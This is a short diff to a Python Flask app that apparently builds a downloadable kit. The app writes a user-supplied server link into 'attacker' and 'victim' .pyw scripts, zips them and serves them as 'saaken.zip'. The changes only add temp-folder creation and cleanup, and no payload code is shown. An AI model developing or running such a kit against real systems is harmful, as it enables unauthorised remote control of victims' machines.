@@ -8,6 +8,7 @@ import os
 
 from zipfile import ZipFile
 import glob 
+import shutil
 
 
 app = Flask(__name__)
@@ -30,6 +31,7 @@ def run():
         
     new = str(lines).replace('link = "http://127.0.0.1:3000"', 'link = "' + request.values['serverlink'] + '"')
     s = str(random.randint(0, 1000000))
+    os.makedirs('temp', exist_ok=True)
     with open(f"temp/attacker_{s}.pyw", "w+") as f:
         f.write(new)
         
@@ -46,7 +48,7 @@ def run():
             zf.write(f"temp/attacker_{s}.pyw", os.path.basename(f"temp/attacker_{s}.pyw"))
             zf.write(f"temp/victim_{_s}.pyw", os.path.basename(f"temp/victim_{_s}.pyw"))
     stream.seek(0)
-      
+    shutil.rmtree('temp')
         
     return send_file(stream, download_name="saaken.zip", as_attachment=True)
 
